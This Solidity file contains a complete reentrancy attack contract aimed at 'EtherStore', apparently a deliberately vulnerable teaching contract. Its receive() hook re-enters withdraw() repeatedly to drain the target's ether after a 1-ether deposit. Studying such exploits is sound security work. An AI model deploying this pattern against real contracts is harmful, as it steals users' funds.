//SPDX-License-Identifier: AGPL-3.0-only

pragma solidity ^0.8.13;

import {EtherStore} from "./EtherStoreVuln.sol";

contract Attack {
    EtherStore public etherStore;
    uint256 public constant AMOUNT = 1 ether;

    error InsufficientValue(uint256 value, uint256 amount);

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    // fallback() external payable {
    //     if (address(etherStore).balance >= AMOUNT) {
    //         etherStore.withdraw();
    //     }
    // }

    receive() external payable {
        if (address(etherStore).balance >= AMOUNT) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        if (msg.value < AMOUNT) {
            revert InsufficientValue(msg.value, AMOUNT);
        }
        etherStore.deposit{value: AMOUNT}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
